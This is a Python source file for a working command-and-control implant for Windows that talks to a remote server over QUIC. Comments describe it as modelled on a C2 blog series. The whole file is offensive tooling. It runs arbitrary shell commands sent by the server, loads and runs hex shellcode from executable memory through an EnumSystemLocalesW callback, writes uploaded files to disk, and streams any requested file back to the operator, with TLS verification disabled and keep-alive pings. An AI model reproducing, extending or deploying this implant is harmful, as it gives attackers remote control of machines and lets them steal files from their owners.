import asyncio
import logging
import ssl
import subprocess
import os
import hashlib
from aioquic.asyncio import connect, QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import StreamDataReceived, ConnectionTerminated
import ctypes
from ctypes import wintypes, c_void_p, c_size_t

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = c_void_p
kernel32.VirtualAlloc.argtypes = [c_void_p, c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualFree.argtypes = [c_void_p, c_size_t, wintypes.DWORD]
kernel32.VirtualFree.restype = wintypes.BOOL
kernel32.RtlMoveMemory.argtypes = [c_void_p, c_void_p, c_size_t]

MEM_COMMIT             = 0x1000
MEM_RESERVE            = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
MEM_RELEASE            = 0x8000

UPLOAD_DIR = r"C:\users\public\uploads"

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


async def execute_shellcode(shellcode_bytes):
    if not shellcode_bytes:
        return "[IMPLANT] No shellcode provided"
    try:
        sz = len(shellcode_bytes)
        addr = kernel32.VirtualAlloc(None, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            return "[IMPLANT] VirtualAlloc failed"
        buf = (ctypes.c_ubyte * sz).from_buffer_copy(shellcode_bytes)
        kernel32.RtlMoveMemory(c_void_p(addr), buf, sz)

        def call_enum():
            try:
                return kernel32.EnumSystemLocalesW(c_void_p(addr), 0)
            except Exception as e:
                return f"Error: {e}"

        loop = asyncio.get_event_loop()
        try:
            success = await asyncio.wait_for(
                loop.run_in_executor(None, call_enum), timeout=10.0)
            kernel32.VirtualFree(addr, 0, MEM_RELEASE)
            if isinstance(success, bool):
                return "[IMPLANT] Shellcode executed successfully" if success \
                       else "[IMPLANT] EnumSystemLocalesW returned FALSE"
            return f"[IMPLANT] Shellcode execution failed: {success}"
        except asyncio.TimeoutError:
            kernel32.VirtualFree(addr, 0, MEM_RELEASE)
            return "[IMPLANT] Shellcode execution timed out"
    except Exception as e:
        return f"[IMPLANT] Shellcode execution failed: {e}"


class ImplantProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # Upload state = accumulates raw binary across multiple StreamDataReceived events
        self._upload_file    = None   # open file handle
        self._upload_path    = None   # destination path
        self._upload_expect  = 0      # total bytes expected
        self._upload_recvd   = 0      # bytes written so far
        self._upload_sid     = None   # stream id to ack on

        # Download state set while streaming a file out
        self._downloading    = False

    def connection_made(self, transport):
        super().connection_made(transport)
        logger.info("[IMPLANT] QUIC connection established!")

    def connection_lost(self, exc):
        super().connection_lost(exc)
        logger.error(f"[IMPLANT] Connection lost: {exc}")
        import sys; sys.exit(0)

    def _send(self, stream_id, data):
        """Send bytes or str on stream_id."""
        if isinstance(data, str):
            data = data.encode()
        self._quic.send_stream_data(stream_id, data, end_stream=False)
        self.transmit()

    def quic_event_received(self, event):
        if not isinstance(event, StreamDataReceived):
            if isinstance(event, ConnectionTerminated):
                logger.error(f"[IMPLANT] Server closed: {event.reason_phrase}")
                import sys; sys.exit(0)
            return

        raw  = event.data
        sid  = event.stream_id

        #If we're mid-upload, feed raw bytes directly into the file
        if self._upload_file is not None:
            remaining = self._upload_expect - self._upload_recvd
            chunk = raw[:remaining]
            self._upload_file.write(chunk)
            self._upload_recvd += len(chunk)
            logger.debug(f"[IMPLANT] Upload progress: {self._upload_recvd}/{self._upload_expect}")

            if self._upload_recvd >= self._upload_expect:
                self._upload_file.close()
                self._upload_file = None
                logger.info(f"[IMPLANT] Upload complete: {self._upload_path}")
                self._send(self._upload_sid, "File successfully uploaded!\n")
                self._upload_path   = None
                self._upload_expect = 0
                self._upload_recvd  = 0
                self._upload_sid    = None
            return  # don't try to decode as a command

        # ── Normal command path ───────────────────────────────────────────────
        cmd = raw.decode('utf-8', errors='ignore').strip()
        if not cmd or cmd == "KEEPALIVE":
            return

        logger.info(f"[IMPLANT] Received: {cmd[:80]}{'...' if len(cmd) > 80 else ''}")

        try:
            # ── cd ────────────────────────────────────────────────────────────
            if cmd.startswith("cd "):
                new_dir = cmd[3:].strip()
                try:
                    os.chdir(new_dir)
                    self._send(sid, f"Changed directory to {new_dir}")
                except Exception as e:
                    self._send(sid, f"Failed to change directory: {e}")

            # ── shellcode ─────────────────────────────────────────────────────
            elif cmd.startswith("exec_shellcode "):
                _, hex_sc = cmd.split(" ", 1)
                shellcode_bytes = bytes.fromhex(hex_sc.strip())

                async def run_sc():
                    self._send(sid, await execute_shellcode(shellcode_bytes))
                asyncio.ensure_future(run_sc())

            # ── upload header: ":upload:|<filename>|<filesize>" ───────────────
            # Modeled after original c2 blog Part 2 — '|' replaces ':' to avoid Windows path issues
            elif cmd.startswith(":upload:|"):
                parts    = cmd.split("|")   # [':upload:', filename, filesize]
                filename = parts[1]
                filesize = int(parts[2])

                os.makedirs(UPLOAD_DIR, exist_ok=True)
                filepath = os.path.join(UPLOAD_DIR, filename)

                self._upload_path   = filepath
                self._upload_expect = filesize
                self._upload_recvd  = 0
                self._upload_file   = open(filepath, 'wb')
                self._upload_sid    = sid

                logger.info(f"[IMPLANT] Upload starting: {filepath} ({filesize} bytes)")
                self._send(sid, "***Ready for upload***\n")

            # ── download request: "~download~|<filepath>" ─────────────────────
            # Modeled after original c2 blog Part 2 — '|' replaces '~' delimiter for path safety
            elif cmd.startswith("~download~|"):
                parts    = cmd.split("|", 1)
                filepath = parts[1].strip()

                async def send_file():
                    try:
                        if not os.path.isfile(filepath):
                            self._send(sid, f"ERROR: File not found: {filepath}\n")
                            return

                        filesize = os.path.getsize(filepath)
                        logger.info(f"[IMPLANT] Download: {filepath} ({filesize} bytes)")

                        # Send filesize first
                        self._send(sid, str(filesize))
                        await asyncio.sleep(0.1)

                        # Stream raw binary in 4096-byte chunks
                        with open(filepath, 'rb') as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk:
                                    break
                                self._send(sid, chunk)
                                await asyncio.sleep(0)  # yield to event loop

                        logger.info(f"[IMPLANT] Download complete: {filepath}")

                    except Exception as e:
                        logger.error(f"[IMPLANT] Download error: {e}")
                        self._send(sid, f"ERROR: {e}\n")

                asyncio.ensure_future(send_file())

            # ── regular shell command ─────────────────────────────────────────
            else:
                result = subprocess.run(
                    f"cmd.exe /c {cmd}",
                    shell=True, capture_output=True, text=True, timeout=15)
                output = result.stdout + result.stderr or "(no output)"
                self._send(sid, output)

        except Exception as e:
            self._send(sid, f"Execution error: {e}")


async def keep_alive(protocol):
    while True:
        try:
            await asyncio.sleep(20)
            protocol._quic.send_ping(uid=0)
            protocol.transmit()
            logger.debug("[IMPLANT] Sent PING")
        except Exception as e:
            logger.error(f"[IMPLANT] Keep-alive failed: {e}")
            break


async def run_implant(host="127.0.0.1", port=4433):
    config = QuicConfiguration(is_client=True, alpn_protocols=["g3tsyst3m"])
    config.verify_mode = ssl.CERT_NONE
    config.max_idle_timeout = 600000

    logger.info(f"[IMPLANT] Connecting to {host}:{port}...")
    try:
        async with connect(host, port, configuration=config,
                           create_protocol=ImplantProtocol,
                           wait_connected=True) as protocol:
            logger.info("[IMPLANT] Connected - opening command stream...")
            stream_id = protocol._quic.get_next_available_stream_id(is_unidirectional=False)
            protocol._quic.send_stream_data(stream_id, b"READY\n", end_stream=False)
            protocol.transmit()
            logger.info(f"[IMPLANT] Stream {stream_id} open - awaiting commands...")
            await asyncio.gather(keep_alive(protocol), asyncio.Future())

    except asyncio.TimeoutError:
        logger.error("[IMPLANT] Connection timeout")
    except ConnectionRefusedError:
        logger.error("[IMPLANT] Connection refused")
    except ssl.SSLError as e:
        logger.error(f"[IMPLANT] SSL error: {e}")
    except Exception as e:
        logger.error(f"[IMPLANT] Connection failed: {e}")
        import traceback; traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(run_implant())